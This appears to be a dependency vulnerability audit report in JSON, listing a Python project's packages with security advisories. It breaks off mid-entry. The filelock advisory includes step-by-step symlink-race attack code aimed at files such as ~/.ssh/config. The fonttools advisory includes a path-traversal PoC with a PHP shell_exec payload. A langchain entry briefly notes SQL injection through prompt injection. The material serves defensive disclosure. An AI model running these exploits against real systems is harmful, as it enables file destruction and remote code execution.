{"dependencies": [{"name": "agno", "version": "2.2.11", "vulns": []}, {"name": "aider-chat", "version": "0.82.3", "vulns": []}, {"name": "aiocache", "version": "0.12.2", "vulns": []}, {"name": "aiodns", "version": "3.6.0", "vulns": []}, {"name": "aiohappyeyeballs", "version": "2.6.1", "vulns": []}, {"name": "aiohttp", "version": "3.13.2", "vulns": [{"id": "GHSA-6mq8-rvhq-8wgg", "fix_versions": ["3.13.3"], "aliases": ["CVE-2025-69223"], "description": "### Summary A zip bomb can be used to execute a DoS against the aiohttp server.  ### Impact An attacker may be able to send a compressed request that when decompressed by aiohttp could exhaust the host's memory.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/2b920c39002cee0ec5b402581779bbaaf7c9138a"}, {"id": "GHSA-69f9-5gxw-wvc2", "fix_versions": ["3.13.3"], "aliases": ["CVE-2025-69224"], "description": "### Summary The Python HTTP parser may allow a request smuggling attack with the presence of non-ASCII characters.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or AIOHTTP_NO_EXTENSIONS is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/32677f2adfd907420c078dda6b79225c6f4ebce0"}, {"id": "GHSA-6jhg-hg63-jvvf", "fix_versions": ["3.13.3"], "aliases": ["CVE-2025-69228"], "description": "### Summary A request can be crafted in such a way that an aiohttp server's memory fills up uncontrollably during processing.  ### Impact If an application includes a handler that uses the `Request.post()` method, an attacker may be able to freeze the server by exhausting the memory.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/b7dbd35375aedbcd712cbae8ad513d56d11cce60"}, {"id": "GHSA-g84x-mcqj-x9qq", "fix_versions": ["3.13.3"], "aliases": ["CVE-2025-69229"], "description": "### Summary  Handling of chunked messages can result in excessive blocking CPU usage when receiving a large number of chunks.  ### Impact  If an application makes use of the `request.read()` method in an endpoint, it may be possible for an attacker to cause the server to spend a moderate amount of blocking CPU time (e.g. 1 second) while processing the request. This could potentially lead to DoS as the server would be unable to handle other requests during that time.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/dc3170b56904bdf814228fae70a5501a42a6c712 Patch: https://github.com/aio-libs/aiohttp/commit/4ed97a4e46eaf61bd0f05063245f613469700229"}, {"id": "GHSA-fh55-r93g-j68g", "fix_versions": ["3.13.3"], "aliases": ["CVE-2025-69230"], "description": "### Summary Reading multiple invalid cookies can lead to a logging storm.  ### Impact If the ``cookies`` attribute is accessed in an application, then an attacker may be able to trigger a storm of warning-level logs using a specially crafted Cookie header.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/64629a0834f94e46d9881f4e99c41a137e1f3326"}, {"id": "GHSA-54jq-c3m8-4m76", "fix_versions": ["3.13.3"], "aliases": ["CVE-2025-69226"], "description": "### Summary Path normalization for static files prevents path traversal, but opens up the ability for an attacker to ascertain the existence of absolute path components.  ### Impact If an application uses `web.static()` (not recommended for production deployments), it may be possible for an attacker to ascertain the existence of path components.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/f2a86fd5ac0383000d1715afddfa704413f0711e"}, {"id": "GHSA-jj3x-wxrx-4x23", "fix_versions": ["3.13.3"], "aliases": ["CVE-2025-69227"], "description": "### Summary When assert statements are bypassed, an infinite loop can occur, resulting in a DoS attack when processing a POST body.  ### Impact If optimisations are enabled (`-O` or `PYTHONOPTIMIZE=1`), and the application includes a handler that uses the `Request.post()` method, then an attacker may be able to execute a DoS attack with a specially crafted message.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/bc1319ec3cbff9438a758951a30907b072561259"}, {"id": "GHSA-mqqc-3gqh-h2x8", "fix_versions": ["3.13.3"], "aliases": ["CVE-2025-69225"], "description": "### Summary  The parser allows non-ASCII decimals to be present in the Range header.  ### Impact  There is no known impact, but there is the possibility that there's a method to exploit a request smuggling vulnerability.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/c7b7a044f88c71cefda95ec75cdcfaa4792b3b96"}]}, {"name": "aiomultiprocess", "version": "0.9.1", "vulns": []}, {"name": "aioredis", "version": "2.0.1", "vulns": []}, {"name": "aiosignal", "version": "1.4.0", "vulns": []}, {"name": "altgraph", "version": "0.17.2", "vulns": []}, {"name": "amqp", "version": "5.3.1", "vulns": []}, {"name": "annotated-doc", "version": "0.0.4", "vulns": []}, {"name": "annotated-types", "version": "0.7.0", "vulns": []}, {"name": "anthropic", "version": "0.75.0", "vulns": []}, {"name": "anyio", "version": "4.12.0", "vulns": []}, {"name": "appnope", "version": "0.1.4", "vulns": []}, {"name": "argcomplete", "version": "3.6.3", "vulns": []}, {"name": "argon2-cffi", "version": "25.1.0", "vulns": []}, {"name": "argon2-cffi-bindings", "version": "25.1.0", "vulns": []}, {"name": "asgi-lifespan", "version": "2.1.0", "vulns": []}, {"name": "asgiref", "version": "3.11.0", "vulns": []}, {"name": "asteval", "version": "1.0.6", "vulns": []}, {"name": "astor", "version": "0.8.1", "vulns": []}, {"name": "asttokens", "version": "3.0.0", "vulns": []}, {"name": "async-timeout", "version": "4.0.3", "vulns": []}, {"name": "asyncpg", "version": "0.30.0", "vulns": []}, {"name": "attrs", "version": "25.4.0", "vulns": []}, {"name": "authlib", "version": "1.6.6", "vulns": []}, {"name": "backoff", "version": "2.2.1", "vulns": []}, {"name": "backports-asyncio-runner", "version": "1.2.0", "vulns": []}, {"name": "backports-datetime-fromisoformat", "version": "2.0.3", "vulns": []}, {"name": "bandit", "version": "1.8.6", "vulns": []}, {"name": "bc-detect-secrets", "version": "1.5.45", "vulns": []}, {"name": "bc-jsonpath-ng", "version": "1.6.1", "vulns": []}, {"name": "bc-python-hcl2", "version": "0.4.3", "vulns": []}, {"name": "bcrypt", "version": "4.2.1", "vulns": []}, {"name": "beartype", "version": "0.22.2", "vulns": []}, {"name": "beautifulsoup4", "version": "4.13.4", "vulns": []}, {"name": "billiard", "version": "4.2.3", "vulns": []}, {"name": "black", "version": "25.11.0", "vulns": []}, {"name": "blessed", "version": "1.25.0", "vulns": []}, {"name": "blinker", "version": "1.9.0", "vulns": []}, {"name": "boltons", "version": "21.0.0", "vulns": []}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "boto3", "version": "1.35.49", "vulns": []}, {"name": "botocore", "version": "1.35.99", "vulns": []}, {"name": "bracex", "version": "2.6", "vulns": []}, {"name": "brotli", "version": "1.2.0", "vulns": []}, {"name": "cachecontrol", "version": "0.14.3", "vulns": []}, {"name": "cached-property", "version": "2.0.1", "vulns": []}, {"name": "cachetools", "version": "5.5.2", "vulns": []}, {"name": "celery", "version": "5.5.3", "vulns": []}, {"name": "certifi", "version": "2026.1.4", "vulns": []}, {"name": "cffi", "version": "2.0.0", "vulns": []}, {"name": "cfgv", "version": "3.4.0", "vulns": []}, {"name": "charset-normalizer", "version": "3.4.4", "vulns": []}, {"name": "checkov", "version": "3.2.496", "vulns": []}, {"name": "click", "version": "8.1.8", "vulns": []}, {"name": "click-didyoumean", "version": "0.3.1", "vulns": []}, {"name": "click-option-group", "version": "0.5.9", "vulns": []}, {"name": "click-plugins", "version": "1.1.1.2", "vulns": []}, {"name": "click-repl", "version": "0.3.0", "vulns": []}, {"name": "cloudsplaining", "version": "0.7.0", "vulns": []}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "comm", "version": "0.2.3", "vulns": []}, {"name": "configargparse", "version": "1.7", "vulns": []}, {"name": "contextlib2", "version": "21.6.0", "vulns": []}, {"name": "contourpy", "version": "1.3.0", "vulns": []}, {"name": "control", "version": "0.9.4", "vulns": []}, {"name": "copilotkit", "version": "0.1.39", "vulns": []}, {"name": "coverage", "version": "7.10.7", "vulns": []}, {"name": "crewai", "version": "0.5.0", "vulns": []}, {"name": "cryptography", "version": "46.0.3", "vulns": []}, {"name": "cssselect2", "version": "0.8.0", "vulns": []}, {"name": "cycler", "version": "0.12.1", "vulns": []}, {"name": "cyclonedx-python-lib", "version": "7.6.2", "vulns": []}, {"name": "dataclasses-json", "version": "0.6.7", "vulns": []}, {"name": "debugpy", "version": "1.8.18", "vulns": []}, {"name": "decorator", "version": "5.2.1", "vulns": []}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "deprecated", "version": "1.3.1", "vulns": []}, {"name": "diff-match-patch", "version": "20241021", "vulns": []}, {"name": "diskcache", "version": "5.6.3", "vulns": []}, {"name": "distlib", "version": "0.4.0", "vulns": []}, {"name": "distro", "version": "1.9.0", "vulns": []}, {"name": "dnspython", "version": "2.7.0", "vulns": []}, {"name": "docker", "version": "7.1.0", "vulns": []}, {"name": "dockerfile-parse", "version": "2.0.1", "vulns": []}, {"name": "docstring-parser", "version": "0.17.0", "vulns": []}, {"name": "dparse", "version": "0.6.4", "vulns": []}, {"name": "dpath", "version": "2.1.3", "vulns": []}, {"name": "duckduckgo-search", "version": "8.1.1", "vulns": []}, {"name": "ecdsa", "version": "0.19.1", "vulns": [{"id": "GHSA-wj6h-64fc-37mp", "fix_versions": [], "aliases": ["CVE-2024-23342"], "description": "python-ecdsa has been found to be subject to a Minerva timing attack on the P-256 curve. Using the `ecdsa.SigningKey.sign_digest()` API function and timing signatures an attacker can leak the internal nonce which may allow for private key discovery. Both ECDSA signatures, key generation, and ECDH operations are affected. ECDSA signature verification is unaffected. The python-ecdsa project considers side channel attacks out of scope for the project and there is no planned fix."}]}, {"name": "editor", "version": "1.6.6", "vulns": []}, {"name": "email-validator", "version": "2.3.0", "vulns": []}, {"name": "et-xmlfile", "version": "2.0.0", "vulns": []}, {"name": "exceptiongroup", "version": "1.3.1", "vulns": []}, {"name": "executing", "version": "2.2.1", "vulns": []}, {"name": "face", "version": "24.0.0", "vulns": []}, {"name": "fastapi", "version": "0.115.14", "vulns": []}, {"name": "filelock", "version": "3.18.0", "vulns": [{"id": "GHSA-w853-jp5j-5j7f", "fix_versions": ["3.20.1"], "aliases": ["CVE-2025-68146"], "description": "### Impact  A Time-of-Check-Time-of-Use (TOCTOU) race condition allows local attackers to corrupt or truncate arbitrary user files through symlink attacks. The vulnerability exists in both Unix and Windows lock file creation where filelock checks if a file exists before opening it with O_TRUNC. An attacker can create a symlink pointing to a victim file in the time gap between the check and open, causing os.open() to follow the symlink and truncate the target file.  **Who is impacted:**  All users of filelock on Unix, Linux, macOS, and Windows systems. The vulnerability cascades to dependent libraries:  - **virtualenv users**: Configuration files can be overwritten with virtualenv metadata, leaking sensitive paths - **PyTorch users**: CPU ISA cache or model checkpoints can be corrupted, causing crashes or ML pipeline failures - **poetry/tox users**: through using virtualenv or filelock on their own.  Attack requires local filesystem access and ability to create symlinks (standard user permissions on Unix; Developer Mode on Windows 10+). Exploitation succeeds within 1-3 attempts when lock file paths are predictable.  ### Patches  Fixed in version **3.20.1**.  **Unix/Linux/macOS fix:** Added O_NOFOLLOW flag to os.open() in UnixFileLock.\\_acquire() to prevent symlink following.  **Windows fix:** Added GetFileAttributesW API check to detect reparse points (symlinks/junctions) before opening files in WindowsFileLock.\\_acquire().  **Users should upgrade to filelock 3.20.1 or later immediately.**  ### Workarounds  If immediate upgrade is not possible:  1. Use SoftFileLock instead of UnixFileLock/WindowsFileLock (note: different locking semantics, may not be suitable for all use cases) 2. Ensure lock file directories have restrictive permissions (chmod 0700) to prevent untrusted users from creating symlinks 3. Monitor lock file directories for suspicious symlinks before running trusted applications  **Warning:** These workarounds provide only partial mitigation. The race condition remains exploitable. Upgrading to version 3.20.1 is strongly recommended.  ______________________________________________________________________  ## Technical Details: How the Exploit Works  ### The Vulnerable Code Pattern  **Unix/Linux/macOS** (`src/filelock/_unix.py:39-44`):  ```python def _acquire(self) -> None:     ensure_directory_exists(self.lock_file)     open_flags = os.O_RDWR | os.O_TRUNC  # (1) Prepare to truncate     if not Path(self.lock_file).exists():  # (2) CHECK: Does file exist?         open_flags |= os.O_CREAT     fd = os.open(self.lock_file, open_flags, ...)  # (3) USE: Open and truncate ```  **Windows** (`src/filelock/_windows.py:19-28`):  ```python def _acquire(self) -> None:     raise_on_not_writable_file(self.lock_file)  # (1) Check writability     ensure_directory_exists(self.lock_file)     flags = os.O_RDWR | os.O_CREAT | os.O_TRUNC  # (2) Prepare to truncate     fd = os.open(self.lock_file, flags, ...)  # (3) Open and truncate ```  ### The Race Window  The vulnerability exists in the gap between operations:  **Unix variant:**  ``` Time    Victim Thread                          Attacker Thread ----    -------------                          --------------- T0      Check: lock_file exists? \u2192 False T1                                             \u2193 RACE WINDOW T2                                             Create symlink: lock \u2192 victim_file T3      Open lock_file with O_TRUNC         \u2192 Follows symlink         \u2192 Opens victim_file         \u2192 Truncates victim_file to 0 bytes! \u2620\ufe0f ```  **Windows variant:**  ``` Time    Victim Thread                          Attacker Thread ----    -------------                          --------------- T0      Check: lock_file writable? T1                                             \u2193 RACE WINDOW T2                                             Create symlink: lock \u2192 victim_file T3      Open lock_file with O_TRUNC         \u2192 Follows symlink/junction         \u2192 Opens victim_file         \u2192 Truncates victim_file to 0 bytes! \u2620\ufe0f ```  ### Step-by-Step Attack Flow  **1. Attacker Setup:**  ```python # Attacker identifies target application using filelock lock_path = \"/tmp/myapp.lock\"  # Predictable lock path victim_file = \"/home/victim/.ssh/config\"  # High-value target ```  **2. Attacker Creates Race Condition:**  ```python import os import threading   def attacker_thread():     # Remove any existing lock file     try:         os.unlink(lock_path)     except FileNotFoundError:         pass      # Create symlink pointing to victim file     os.symlink(victim_file, lock_path)     print(f\"[Attacker] Created: {lock_path} \u2192 {victim_file}\")   # Launch attack threading.Thread(target=attacker_thread).start() ```  **3. Victim Application Runs:**  ```python from filelock import UnixFileLock  # Normal application code lock = UnixFileLock(\"/tmp/myapp.lock\") lock.acquire()  # \u2190 VULNERABILITY TRIGGERED HERE # At this point, /home/victim/.ssh/config is now 0 bytes! ```  **4. What Happens Inside os.open():**  On Unix systems, when `os.open()` is called:  ```c // Linux kernel behavior (simplified) int open(const char *pathname, int flags) {     struct file *f = path_lookup(pathname);  // Resolves symlinks by default!      if (flags & O_TRUNC) {         truncate_file(f);  // \u2190 Truncates the TARGET of the symlink     }      return file_descriptor; } ```  Without `O_NOFOLLOW` flag, the kernel follows the symlink and truncates the target file.  ### Why the Attack Succeeds Reliably  **Timing Characteristics:**  - **Check operation** (Path.exists()): ~100-500 nanoseconds - **Symlink creation** (os.symlink()): ~1-10 microseconds - **Race window**: ~1-5 microseconds (very small but exploitable) - **Thread scheduling quantum**: ~1-10 milliseconds  **Success factors:**  1. **Tight loop**: Running attack in a loop hits the race window within 1-3 attempts 2. **CPU scheduling**: Modern OS thread schedulers frequently context-switch during I/O operations 3. **No synchronization**: No atomic file creation prevents the race 4. **Symlink speed**: Creating symlinks is extremely fast (metadata-only operation)  ### Real-World Attack Scenarios  **Scenario 1: virtualenv Exploitation**  ```python # Victim runs: python -m venv /tmp/myenv # Attacker racing to create: os.symlink(\"/home/victim/.bashrc\", \"/tmp/myenv/pyvenv.cfg\")  # Result: /home/victim/.bashrc overwritten with: # home = /usr/bin/python3 # include-system-site-packages = false # version = 3.11.2 # \u2190 Original .bashrc contents LOST + virtualenv metadata LEAKED to attacker ```  **Scenario 2: PyTorch Cache Poisoning**  ```python # Victim runs: import torch # PyTorch checks CPU capabilities, uses filelock on cache # Attacker racing to create: os.symlink(\"/home/victim/.torch/compiled_model.pt\", \"/home/victim/.cache/torch/cpu_isa_check.lock\")  # Result: Trained ML model checkpoint truncated to 0 bytes # Impact: Weeks of training lost, ML pipeline DoS ```  ### Why Standard Defenses Don't Help  **File permissions don't prevent this:**  - Attacker doesn't need write access to victim_file - os.open() with O_TRUNC follows symlinks using the *victim's* permissions - The victim process truncates its own file  **Directory permissions help but aren't always feasible:**  - Lock files often created in shared /tmp directory (mode 1777) - Applications may not control lock file location - Many apps use predictable paths in user-writable directories  **File locking doesn't prevent this:**  - The truncation happens *during* the open() call, before any lock is acquired - fcntl.flock() only prevents concurrent lock acquisition, not symlink attacks  ### Exploitation Proof-of-Concept Results  From empirical testing with the provided PoCs:  **Simple Direct Attack** (`filelock_simple_poc.py`):  - Success rate: 33% per attempt (1 in 3 tries) - Average attempts to success: 2.1 - Target file reduced to 0 bytes in \\<100ms  **virtualenv Attack** (`weaponized_virtualenv.py`):  - Success rate: ~90% on first attempt (deterministic timing) - Information leaked: File paths, Python version, system configuration - Data corruption: Complete loss of original file contents  **PyTorch Attack** (`weaponized_pytorch.py`):  - Success rate: 25-40% per attempt - Impact: Application crashes, model loading failures - Recovery: Requires cache rebuild or model retraining  **Discovered and reported by:** George Tsigourakos (@tsigouris007)"}]}, {"name": "flake8", "version": "7.3.0", "vulns": []}, {"name": "flask", "version": "3.1.2", "vulns": []}, {"name": "flask-cors", "version": "6.0.1", "vulns": []}, {"name": "flask-login", "version": "0.6.3", "vulns": []}, {"name": "fonttools", "version": "4.60.1", "vulns": [{"id": "GHSA-768j-98cg-p3fv", "fix_versions": ["4.60.2"], "aliases": ["CVE-2025-66034"], "description": "## Summary  The `fonttools varLib` (or `python3 -m fontTools.varLib`) script has an arbitrary file write vulnerability that leads to remote code execution when a malicious .designspace file is processed. The vulnerability affects the `main()` code path of `fontTools.varLib`, used by the fonttools varLib CLI and any code that invokes `fontTools.varLib.main()`.  The vulnerability exists due to unsanitised filename handling combined with content injection. Attackers can write files to arbitrary filesystem locations via path traversal sequences, and inject malicious code (like PHP) into the output files through XML injection in labelname elements. When these files are placed in web-accessible locations and executed, this achieves remote code execution without requiring any elevated privileges. Once RCE is obtained, attackers can further escalate privileges to compromise system files (like overwriting `/etc/passwd`).  Overall this allows attackers to: - Write font files to arbitrary locations on the filesystem - Overwrite configuration files - Corrupt application files and dependencies - Obtain remote code execution  The attacker controls the file location, extension and contents which could lead to remote code execution as well as enabling a denial of service through file corruption means.  ## Affected Lines  `fontTools/varLib/__init__.py` ```python filename = vf.filename # Unsanitised filename output_path = os.path.join(output_dir, filename) # Path traversal vf.save(output_path) # Arbitrary file write ```  ## PoC 1. Set up `malicious.designspace` and respective `source-*.ttf` files in a directory like `/Users/<username>/testing/demo/` (will impact relative file location within malicious.designspace)  `setup.py` ```python #!/usr/bin/env python3 import os  from fontTools.fontBuilder import FontBuilder from fontTools.pens.ttGlyphPen import TTGlyphPen  def create_source_font(filename, weight=400):     fb = FontBuilder(unitsPerEm=1000, isTTF=True)     fb.setupGlyphOrder([\".notdef\"])     fb.setupCharacterMap({})          pen = TTGlyphPen(None)     pen.moveTo((0, 0))     pen.lineTo((500, 0))     pen.lineTo((500, 500))     pen.lineTo((0, 500))     pen.closePath()          fb.setupGlyf({\".notdef\": pen.glyph()})     fb.setupHorizontalMetrics({\".notdef\": (500, 0)})     fb.setupHorizontalHeader(ascent=800, descent=-200)     fb.setupOS2(usWeightClass=weight)     fb.setupPost()     fb.setupNameTable({\"familyName\": \"Test\", \"styleName\": f\"Weight{weight}\"})     fb.save(filename)  if __name__ == '__main__':     os.chdir(os.path.dirname(os.path.abspath(__file__)))     create_source_font(\"source-light.ttf\", weight=100)     create_source_font(\"source-regular.ttf\", weight=400) ```  `malicious.designspace` ```xml <?xml version='1.0' encoding='UTF-8'?> <designspace format=\"5.0\">   <axes>     <axis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"/>   </axes>      <sources>     <source filename=\"source-light.ttf\" name=\"Light\">       <location>         <dimension name=\"Weight\" xvalue=\"100\"/>       </location>     </source>     <source filename=\"source-regular.ttf\" name=\"Regular\">       <location>         <dimension name=\"Weight\" xvalue=\"400\"/>       </location>     </source>   </sources>      <!-- Filename can be arbitrarily set to any path on the filesystem -->   <variable-fonts>     <variable-font name=\"MaliciousFont\" filename=\"../../tmp/newarbitraryfile.json\">       <axis-subsets>         <axis-subset name=\"Weight\"/>       </axis-subsets>     </variable-font>   </variable-fonts> </designspace> ```  Optional: You can put a file with any material within `../../tmp/newarbitraryfile.json` in advance, the contents in the file will be overwritten after running the setup script in the following step.  2. Run the setup.py script to generate `source-*.tff` files required for the malicious.designspace file. ```bash python3 setup.py ``` 3. Execute the given payload using the vulnerable varLib saving the file into the arbitrary file location of filename ```bash fonttools varLib malicious.designspace ``` 4. Validate arbitrary file write was performed by looking at path assigned within malicious designspace ```bash cat {{filename_location}} ``` 5. After validating that we can provide arbitrary write to any location, we can also validate that we can control sections of content as well demonstrated with the below payload.  `malicious2.designspace` ```xml <?xml version='1.0' encoding='UTF-8'?> <designspace format=\"5.0\"> \t<axes>         <!-- XML injection occurs in labelname elements with CDATA sections --> \t    <axis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"> \t        <labelname xml:lang=\"en\"><![CDATA[<?php echo shell_exec(\"/usr/bin/touch /tmp/MEOW123\");?>]]]]><![CDATA[>]]></labelname> \t        <labelname xml:lang=\"fr\">MEOW2</labelname> \t    </axis> \t</axes> \t<axis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"/> \t<sources> \t\t<source filename=\"source-light.ttf\" name=\"Light\"> \t\t\t<location> \t\t\t\t<dimension name=\"Weight\" xvalue=\"100\"/> \t\t\t</location> \t\t</source> \t\t<source filename=\"source-regular.ttf\" name=\"Regular\"> \t\t\t<location> \t\t\t\t<dimension name=\"Weight\" xvalue=\"400\"/> \t\t\t</location> \t\t</source> \t</sources> \t<variable-fonts> \t\t<variable-font name=\"MyFont\" filename=\"output.ttf\"> \t\t\t<axis-subsets> \t\t\t\t<axis-subset name=\"Weight\"/> \t\t\t</axis-subsets> \t\t</variable-font> \t</variable-fonts> \t<instances> \t\t<instance name=\"Display Thin\" familyname=\"MyFont\" stylename=\"Thin\"> \t\t\t<location><dimension name=\"Weight\" xvalue=\"100\"/></location> \t\t\t<labelname xml:lang=\"en\">Display Thin</labelname> \t\t</instance> \t</instances> </designspace> ```  6. When the program is run, we can show we control the contents in the new file ```bash fonttools varLib malicious2.designspace -o file123 ``` Here being outputted to a localised area ignoring filename presented in variable-font  7. We can look inside file123 to validate user controlled injection ```bash cat file123 ``` to show `<?php echo shell_exec(\"/usr/bin/touch /tmp/MEOW123\");?>]]>`  8. Executing the file and reading looking at the newly generated file ```bash php file123 ls -la /tmp/MEOW123 ``` we can see that the file was just created showing RCE.  ## Recommendations  - Ensure output file paths configured within designspace files are restricted to the local directory or consider further security measures to prevent arbitrary file write/overwrite within any directory on the system"}]}, {"name": "frozenlist", "version": "1.6.0", "vulns": []}, {"name": "fsspec", "version": "2025.3.2", "vulns": []}, {"name": "future", "version": "0.18.2", "vulns": [{"id": "PYSEC-2022-42991", "fix_versions": ["0.18.3"], "aliases": ["CVE-2022-40899"], "description": "An issue discovered in Python Charmers Future 0.18.2 and earlier allows remote attackers to cause a denial of service via crafted Set-Cookie header from malicious web server."}]}, {"name": "fuzzywuzzy", "version": "0.18.0", "vulns": []}, {"name": "gevent", "version": "25.9.1", "vulns": []}, {"name": "geventhttpclient", "version": "2.3.7", "vulns": []}, {"name": "git-python", "version": "1.0.3", "vulns": []}, {"name": "gitdb", "version": "4.0.12", "vulns": []}, {"name": "gitpython", "version": "3.1.44", "vulns": []}, {"name": "glom", "version": "22.1.0", "vulns": []}, {"name": "google-ai-generativelanguage", "version": "0.6.6", "vulns": []}, {"name": "google-api-core", "version": "2.24.2", "vulns": []}, {"name": "google-api-python-client", "version": "2.169.0", "vulns": []}, {"name": "google-auth", "version": "2.40.0", "vulns": []}, {"name": "google-auth-httplib2", "version": "0.2.0", "vulns": []}, {"name": "google-genai", "version": "1.47.0", "vulns": []}, {"name": "google-generativeai", "version": "0.7.2", "vulns": []}, {"name": "googleapis-common-protos", "version": "1.70.0", "vulns": []}, {"name": "greenlet", "version": "3.2.4", "vulns": []}, {"name": "grep-ast", "version": "0.8.1", "vulns": []}, {"name": "grpcio", "version": "1.71.0", "vulns": []}, {"name": "grpcio-status", "version": "1.63.0rc1", "vulns": []}, {"name": "gunicorn", "version": "23.0.0", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "hf-xet", "version": "1.2.0", "vulns": []}, {"name": "hiredis", "version": "3.3.0", "vulns": []}, {"name": "html2image", "version": "2.0.7", "vulns": []}, {"name": "html2text", "version": "2024.2.26", "vulns": []}, {"name": "httpcore", "version": "1.0.9", "vulns": []}, {"name": "httplib2", "version": "0.22.0", "vulns": []}, {"name": "httptools", "version": "0.7.1", "vulns": []}, {"name": "httpx", "version": "0.27.2", "vulns": []}, {"name": "httpx-sse", "version": "0.4.3", "vulns": []}, {"name": "huggingface-hub", "version": "0.36.0", "vulns": []}, {"name": "identify", "version": "2.6.15", "vulns": []}, {"name": "idna", "version": "3.11", "vulns": []}, {"name": "ifaddr", "version": "0.2.0", "vulns": []}, {"name": "importlib-metadata", "version": "7.2.1", "vulns": []}, {"name": "importlib-resources", "version": "6.5.2", "vulns": []}, {"name": "inflate64", "version": "1.0.3", "vulns": []}, {"name": "iniconfig", "version": "2.1.0", "vulns": []}, {"name": "inquirer", "version": "2.10.1", "vulns": []}, {"name": "ipykernel", "version": "6.31.0", "vulns": []}, {"name": "ipython", "version": "8.18.1", "vulns": []}, {"name": "isodate", "version": "0.7.2", "vulns": []}, {"name": "isort", "version": "6.1.0", "vulns": []}, {"name": "itsdangerous", "version": "2.2.0", "vulns": []}, {"name": "jedi", "version": "0.19.2", "vulns": []}, {"name": "jinja2", "version": "3.1.6", "vulns": []}, {"name": "jiter", "version": "0.12.0", "vulns": []}, {"name": "jmespath", "version": "1.0.1", "vulns": []}, {"name": "joblib", "version": "1.5.2", "vulns": []}, {"name": "jq", "version": "1.10.0", "vulns": []}, {"name": "jschema-to-python", "version": "1.2.3", "vulns": []}, {"name": "json5", "version": "0.12.0", "vulns": []}, {"name": "jsonpatch", "version": "1.33", "vulns": []}, {"name": "jsonpickle", "version": "4.1.1", "vulns": []}, {"name": "jsonpointer", "version": "3.0.0", "vulns": []}, {"name": "jsonschema", "version": "4.23.0", "vulns": []}, {"name": "jsonschema-specifications", "version": "2025.4.1", "vulns": []}, {"name": "junit-xml", "version": "1.9", "vulns": []}, {"name": "jupyter-client", "version": "8.6.3", "vulns": []}, {"name": "jupyter-core", "version": "5.8.1", "vulns": []}, {"name": "kiwisolver", "version": "1.4.7", "vulns": []}, {"name": "kombu", "version": "5.5.4", "vulns": []}, {"name": "langchain", "version": "0.1.0", "vulns": [{"id": "PYSEC-2024-43", "fix_versions": ["0.1.11"], "aliases": ["CVE-2024-28088"], "description": "LangChain through 0.1.10 allows ../ directory traversal by an actor who is able to control the final part of the path parameter in a load_chain call. This bypasses the intended behavior of loading configurations only from the hwchase17/langchain-hub GitHub repository. The outcome can be disclosure of an API key for a large language model online service, or remote code execution."}, {"id": "PYSEC-2024-115", "fix_versions": ["0.2.0"], "aliases": ["CVE-2024-8309"], "description": "A vulnerability in the GraphCypherQAChain class of langchain-ai/langchain-community version 0.2.5 allows for SQL injection through prompt injection. This vulnerability can lead to unauthorized data manipulation, data exfiltration, denial of service (DoS) by deleting all data, breaches in multi-tenant security environments, and data integrity issues. Attackers can create, update, or delete nodes and relationships without proper authorization, extract sensitive data, disrupt services, access data across different tenants, and compromise the integrity of the database."}, {"id": "PYSEC-2024-118", "fix_versions": ["0.2.5"], "aliases": ["CVE-2024-2965"], "description": "A Denial-of-Service (DoS) vulnerability exists in the `SitemapLoader` class of the `langchain-ai/langchain` repository, affecting all versions. The `parse_sitemap` method, responsible for parsing sitemaps and extracting URLs, lacks a mechanism to prevent infinite recursion when a sitemap URL refers to the current sitemap itself. This oversight allows for the possibility of an infinite loop, leading to a crash by exceeding the maximum recursion depth in Python. This vulnerability can be exploited to occupy server socket/port resources and crash the Python process, impacting the availability of services relying on this functionality."}, {"id": "GHSA-hc5w-c9f8-9cc4", "fix_versions": [], "aliases": ["CVE-2024-7774"], "description": "A path traversal vulnerability exists in the `getFullPath` method of langchain-ai/langchainjs version 0.2.5. This vulnerability allows attackers to save files anywhere in the filesystem, overwrite existing text files, read `.txt` files, and delete files. The vulnerability is exploited through the `setFileContent`, `getParsedFile`, and `mdelete` methods, which do not properly sanitize user input."}]}, {"name": "langchain-anthropic", "version": "0.3.22", "vulns": []}, {"name": "langchain-community", "version": "0.0.20", "vulns": [{"id": "PYSEC-2025-70", "fix_versions": ["0.0.28"], "aliases": ["CVE-2025-2828"], "description": "A Server-Side Request Forgery (SSRF) vulnerability exists in the RequestsToolkit component of the langchain-community package (specifically, langchain_community.agent_toolkits.openapi.toolkit.RequestsToolkit) in langchain-ai/langchain version 0.0.27. This vulnerability occurs because the toolkit does not enforce restrictions on requests to remote internet addresses, allowing it to also access local addresses. As a result, an attacker could exploit this flaw to perform port scans, access local services, retrieve instance metadata from cloud environments (e.g., Azure, AWS), and interact with servers on the local network. This issue has been fixed in version 0.0.28."}, {"id": "GHSA-3hjh-jh2h-vrg6", "fix_versions": ["0.2.5"], "aliases": ["CVE-2024-2965"], "description": "Denial of service in `SitemapLoader` Document Loader in the `langchain-community` package, affecting versions below 0.2.5. The `parse_sitemap` method, responsible for parsing sitemaps and extracting URLs, lacks a mechanism to prevent infinite recursion when a sitemap URL refers to the current sitemap itself. This oversight allows for the possibility of an infinite loop, leading to a crash by exceeding the maximum recursion depth in Python. This vulnerability can be exploited to occupy server socket/port resources and crash the Python process, impacting the availability of services relying on this functionality."}, {"id": "GHSA-q25c-c977-4cmh", "fix_versions": ["0.2.9"], "aliases": ["CVE-2024-3095"], "description": "A Server-Side Request Forgery (SSRF) vulnerability exists in the Web Research Retriever component in langchain-community (langchain-community.retrievers.web_research.WebResearchRetriever). The vulnerability arises because the Web Research Retriever does not restrict requests to remote internet addresses, allowing it to reach local addresses. This flaw enables attackers to execute port scans, access local services, and in some scenarios, read instance metadata from cloud environments. The vulnerability is particularly concerning as it can be exploited to abuse the 